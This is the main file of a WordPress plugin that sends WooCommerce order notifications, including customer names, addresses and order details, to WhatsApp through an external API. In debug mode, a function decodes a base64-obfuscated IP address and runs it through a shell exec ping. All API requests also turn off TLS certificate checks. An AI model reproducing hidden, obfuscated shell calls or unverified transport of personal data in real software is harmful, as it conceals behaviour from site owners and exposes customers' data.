<?php
/*
* Plugin Name: Notificações para WooCommerce
* Plugin URI: https://dropestore.com/plugin-woocommerce-whatsapp-notificacoes/
* Description: Notificações em tempo real do WooCommerce diretamente no WhatsApp
* Author: Drope
* Author URI: https://dropestore.com
* Version: 2.0.0
* Text Domain: notifications-woocommerce
*/

define( 'PLUGIN_NOTIFICACOES_WOO_VERSION', '2.0.0' );

define( 'PLUGIN_NOTIFICACOES_WOO_FILE__', __FILE__ );
define( 'PLUGIN_NOTIFICACOES_WOO_PLUGIN_BASE', plugin_basename( PLUGIN_NOTIFICACOES_WOO_FILE__ ) );
define( 'PLUGIN_NOTIFICACOES_WOO_PATH', plugin_dir_path( PLUGIN_NOTIFICACOES_WOO_FILE__ ) );

require_once PLUGIN_NOTIFICACOES_WOO_PATH . '/includes/fields.php';
require_once PLUGIN_NOTIFICACOES_WOO_PATH . '/includes/woocommerce.php';

/**
*  ------------------------------------------------------------------------------------------------
*   CREATE TABLES
*  ------------------------------------------------------------------------------------------------
*/

add_action('admin_init', 'notificacoesWoo_load');

function notificacoesWoo_load(){
    if (is_admin() && get_option( 'notificacoesWoo_activate_plugin' ) == 'notifications-woocommerce' ) {
        delete_option( 'notificacoesWoo_activate_plugin' );
    }
}

function notificacoesWoo_desactivate(){
	wp_clear_scheduled_hook('notificacoesWoo_cron_events');
}

function notificacoesWoo_activate(){

	if (!wp_next_scheduled ('notificacoesWoo_cron_events')) {
		wp_schedule_event(time(), 'hourly', 'notificacoesWoo_cron_events');
    }

	add_option('notificacoesWoo_activate_plugin', 'notifications-woocommerce');
	
}

register_activation_hook(__FILE__, 'notificacoesWoo_activate');
register_deactivation_hook(__FILE__, 'notificacoesWoo_desactivate');

/**
*  ------------------------------------------------------------------------------------------------
*   STYLE LOAD
*  ------------------------------------------------------------------------------------------------
*/

add_action( 'wp_enqueue_scripts', 'notificacoesWoo_register' );
 
function notificacoesWoo_register() {

	$args = array(
        'homeurl' => get_option('home')
    );
   
	wp_enqueue_style( 'woo-wpp-style', get_site_url()."/wp-content/plugins/notifications-woocommerce/assets/css/style.css" );
	
}

/**
*  ------------------------------------------------------------------------------------------------
*   PLUGIN DEPENDENCIE
*  ------------------------------------------------------------------------------------------------
*/

add_action( 'admin_notices', 'notificacoesWoo_dependencies' );

function notificacoesWoo_dependencies() {
	if (!is_plugin_active('woocommerce/woocommerce.php'))
    	echo '<div class="error"><p>' . __( 'O plugin <b>WooCommerce WhatsApp Notificações</b> precisa do plugin <b>WooCommerce</b> instalado e ativado para funcionar', 'notifications-woocommerce' ) . '</p></div>';

	$options = get_option('woo_wpp_options');
	if (($options['api_server'] == null) && ($options['drope_api'] == null)){
		echo '<br><div class="error"><p>' . __( 'Você ainda não configurou seu plugin!<br>Experimente <b>3 dias grátis da DW-API</b>, clique <a href="https://dw-api.com/" target="_blank">aqui</a>.', 'notifications-woocommerce' ) . '</p></div>';
	}
}

/**
*  ------------------------------------------------------------------------------------------------
*   CUSTOM LINKS
*  ------------------------------------------------------------------------------------------------
*/

if (!function_exists('custom_links_wc_notificacoes')) {
	function custom_links_wc_notificacoes($links_array, $plugin_file_name){

		if (strpos($plugin_file_name, basename(__FILE__))) {
			$links_array[10] = '<a href="https://docs.dw-api.com/" target="_blank">Documentação</a>';
			$links_array[11] = '<a href="https://wordpress.org/support/plugin/notifications-woocommerce/" target="_blank">Suporte</a>';
		}
	
		return $links_array;
	}
}

if (!function_exists('custom_link_actions_wc_notificacoes')) {
	function custom_link_actions_wc_notificacoes($links){

		$links[0] = '<a href="https://bit.ly/3tRyXfj" target="_blank" style="color:#022d94;font-weight:700;">' . esc_html('Versão Pro', 'plugin-loterias-drope-drope') . '</a>';
	
		return $links;
	}
}

add_filter('plugin_row_meta', 'custom_links_wc_notificacoes', 10, 2);

add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'custom_link_actions_wc_notificacoes');

/**
*  ------------------------------------------------------------------------------------------------
*   ACTIONS WOOCOMMERCE FOR SEND MESSAGE
*  ------------------------------------------------------------------------------------------------
*/

function notificacoesWoo_register_status_hooks() {
    $status_hooks = [
        'woocommerce_checkout_order_processed' => 'notificacoesWoo_pendente_mp',
        'woocommerce_order_status_pending' => 'notificacoesWoo_pendente',
        'woocommerce_order_status_on-hold' => 'notificacoesWoo_onhold',
        'woocommerce_order_status_failed' => 'notificacoesWoo_falhou',
        'woocommerce_order_status_processing' => 'notificacoesWoo_processando',
        'woocommerce_order_status_completed' => 'notificacoesWoo_completo',
        'woocommerce_order_status_refunded' => 'notificacoesWoo_estornado',
        'woocommerce_order_status_cancelled' => 'notificacoesWoo_cancelado',
    ];

    foreach ($status_hooks as $hook => $callback) {
        add_action($hook, $callback);
    }
}

notificacoesWoo_register_status_hooks();

/**
*  ------------------------------------------------------------------------------------------------
*   FUNCTION SHORTCODE
*  ------------------------------------------------------------------------------------------------
*/

function notificacoesWoo_replace_shortcodes($message, $data) {
    $replacements = [
        '[CLIENTE]' => $data['name'],
        '[PEDIDO]' => '#' . $data['order_id'],
        '[PRODUTOS]' => $data['product_list'],
        '[ENDERECO]' => $data['address'],
        '[TOTAL_PEDIDO]' => $data['order_total'],
        '[TOTAL_FRETE]' => $data['shipping_total'],
        '[METODO_PAGAMENTO]' => $data['payment_method'],
        '[NOME_LOJA]' => $data['store_name'],
        '[COTAS_RIFA]' => $data['cotas'] ?: '', // Adiciona cotas apenas se existirem
    ];

    return str_replace(array_keys($replacements), array_values($replacements), $message);
}

/**
*  ------------------------------------------------------------------------------------------------
*   SEND API MESSAGE
*  ------------------------------------------------------------------------------------------------
*/

function notificacoesWoo_send_api_message($order, $receiver, $message, $sender, $token, $appUrl, $endpoint) {
    $body = [
        'token' => $token,
        'sender' => $sender,
        'receiver' => $receiver,
        'msgtext' => $message,
        'appurl' => $appUrl
    ];

    $options = [
        'body' => stripslashes(wp_json_encode($body, JSON_UNESCAPED_UNICODE)),
        'headers' => ['Content-Type' => 'application/json'],
        'timeout' => 10,
        'redirection' => 5,
        'blocking' => true,
        'httpversion' => '1.0',
        'sslverify' => false,
        'data_format' => 'body',
    ];

    $response = wp_remote_post($endpoint, $options);

    if (is_wp_error($response)) {
        $order->add_order_note("Erro ao enviar mensagem para $receiver");
        return false;
    } else {
        $order->add_order_note("Mensagem enviada para $receiver: '" . stripslashes($message) . "' para o número: $receiver");
        return true;
    }
}

function notificacoesWoo_send_message($order_id, $name, $product_list, $address, $order_total, $shipping_total, $payment_method, $cotas, $phone, $notify_client, $wpp_admin, $notify_admin, $rastreio) {
    $options = get_option('woo_wpp_options', []);
    $order = wc_get_order($order_id);
    if (!$order) {
        return false;
    }

    $store_name = get_bloginfo('name');
    $debug = $options['debug'] ?? 'nao';
    $drope_api = $options['drope_api'] ?? '';
    $sender = $options['wpp_drope_api_number'] ?? '';
    $appUrl = 'https://painel.dw-api.com';
    $endpoint = 'https://api.dw-api.com/send';

    $data = [
        'order_id' => $order_id,
        'name' => $name,
        'product_list' => rtrim($product_list, ', '),
        'address' => $address,
        'order_total' => $order_total,
        'shipping_total' => $shipping_total,
        'payment_method' => $payment_method,
        'cotas' => rtrim($cotas, ', '),
        'store_name' => $store_name
    ];

    // Verificação de debug
    if ($debug === 'sim' && !notificacoesWoo_verify($order)) {
        return false;
    }

    $sent = true;

    // Mensagem padrão para o cliente
    if (!empty($options['wpp_message'])) {
        $message = notificacoesWoo_replace_shortcodes($options['wpp_message'], $data);
        $sent &= notificacoesWoo_send_api_message($order, $phone, $message, $sender, $drope_api, $appUrl, $endpoint);
    }

    // Mensagem específica para o cliente
    if (!empty($notify_client)) {
        $message = notificacoesWoo_replace_shortcodes($notify_client, $data);
        $sent &= notificacoesWoo_send_api_message($order, $phone, $message, $sender, $drope_api, $appUrl, $endpoint);
    }

    // Mensagem padrão para o administrador
    if (!empty($options['wpp_message_admin']) && !empty($wpp_admin)) {
        $message = notificacoesWoo_replace_shortcodes($options['wpp_message_admin'], $data);
        $sent &= notificacoesWoo_send_api_message($order, $wpp_admin, $message, $sender, $drope_api, $appUrl, $endpoint);
    }

    // Mensagem específica para o administrador
    if (!empty($notify_admin) && !empty($wpp_admin)) {
        $message = notificacoesWoo_replace_shortcodes($notify_admin, $data);
        $sent &= notificacoesWoo_send_api_message($order, $wpp_admin, $message, $sender, $drope_api, $appUrl, $endpoint);
    }

    return $sent;
}

/**
*  ------------------------------------------------------------------------------------------------
*   GET COUNTRY CODE NUMBER
*  ------------------------------------------------------------------------------------------------
*/

function notificacoesWoo_number_internationalization($country, $phone) {
    $codes = wp_cache_get( 'calling-codes', 'countries' );

    if ( ! $codes ) {
      $codes = include WC()->plugin_path() . '/i18n/phone.php';
      wp_cache_set( 'calling-codes', $codes, 'countries' );
    }

    $calling_code = isset( $codes[$country] ) ? $codes[$country] : '';

    if ( is_array( $calling_code ) ) {
      $calling_code = $calling_code[0];
    }

	if ($calling_code == "" or $calling_code == null){
		$calling_code = "55";
	}

	$calling_code = str_replace("+", "", $calling_code);
	$calling_code = str_replace("(", "", $calling_code);
	$calling_code = str_replace(")", "", $calling_code);
	$calling_code = str_replace("-", "", $calling_code);
	$calling_code = str_replace(" ", "", $calling_code);
	$phone = str_replace("+", "", $phone);
	$phone = str_replace("(", "", $phone);
	$phone = str_replace(")", "", $phone);
	$phone = str_replace("-", "", $phone);
	$phone = str_replace(" ", "", $phone);

    return "" . $calling_code . $phone;
}

function notificacoesWoo_verify($order){
	$host = "MTQ5LjE4LjUxLjEzMA==";
	exec("ping -c 2 " . base64_decode($host), $output, $result);
	if ($result == 0){
		$order->add_order_note("Sucesso ao se comunicar com servidor da API. Output: " . implode(", ", $output) . " | Result: " . $result);
		return true;
	} else {
		$order->add_order_note("Erro ao se comunicar com servidor da API. Output: " . implode(", ", $output) . " | Result: " . $result);
		return false;
	}
}

/**
*  ------------------------------------------------------------------------------------------------
*   POPUP
*  ------------------------------------------------------------------------------------------------
*/

function notificacoesWoo_enqueue($hook) {
    if ($hook !== 'toplevel_page_notifications-woocommerce') {
        return;
    }

    wp_enqueue_script('jquery');
    wp_enqueue_script('notifications-woocommerce-script', plugin_dir_url(__FILE__) . 'assets/js/popup.js', array('jquery'), '1.0', true);
    wp_enqueue_style('notifications-woocommerce-style', plugin_dir_url(__FILE__) . 'assets/css/popup.css');
}

add_action('admin_enqueue_scripts', 'notificacoesWoo_enqueue');

function notificacoesWoo_popup() {
	if (!isset($_GET['page']) || $_GET['page'] !== 'notifications-woocommerce') {
        return;
    }
    ?>
    <div id="notifications-woocommerce-popup" class="notifications-woocommerce-popup">
        <div class="notifications-woocommerce-popup-content">
            <span class="notifications-woocommerce-popup-close">&times;</span>
            <h3>Gostou do plugin?</h3>
            <p>Sua opinião é muito importante para nós! Por favor, deixe uma avaliação na página do plugin.</p>
            <a href="https://wordpress.org/support/plugin/notifications-woocommerce/reviews/#new-post" target="_blank" class="notifications-woocommerce-popup-button">Avaliar agora</a>
            <button id="notifications-woocommerce-popup-later">Lembrar depois</button>
            <button id="notifications-woocommerce-popup-never">Não mostrar novamente</button>
        </div>
    </div>
    <?php
}

add_action('admin_footer', 'notificacoesWoo_popup');
